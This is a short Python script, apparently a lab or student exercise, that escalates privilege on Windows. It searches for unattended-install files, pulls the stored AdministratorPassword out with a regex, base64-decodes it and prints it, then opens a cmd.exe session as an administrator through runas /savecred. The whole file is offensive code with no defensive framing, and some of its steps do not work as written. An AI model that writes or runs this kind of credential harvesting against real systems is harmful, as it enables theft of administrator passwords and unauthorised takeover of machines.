import os
import re
import base64
import subprocess


def find_unattended_files():
    paths = [
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\Autounattend.xml",
        "C:\\Windows\\System32\\sysprep\\sysprep.inf"
    ]
    return next((p for p in paths if os.path.exists(p)), None)

def extract_password(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        match = re.search(r'<AdministratorPassword>\s*<Value>(.*?)</Value>', file.read(), re.DOTALL)
        return match.group(1).strip() if match else None

def decode_password(password):
    try:
        return base64.b64decode(password + "==").decode('utf-8')
    except:
        return password

def open_admin_session(username, password):
    temp_file = "C:\\Users\\Student\\Desktop\\pass.txt"

    with open(temp_file, "w") as f:
        f.write(password)


    cmd = f'runas /user:{username} /savecred "cmd.exe"'
    subprocess.run(cmd, shell=True)

    os.remove(temp_file)

file = find_unattended_files()
if file:
    password = extract_password(file)
    if password:
        decoded_password = decode_password(password)
        print("Contraseña encontrada:", decoded_password)
        open_admin_session("SuperAdministrator", decoded_password)
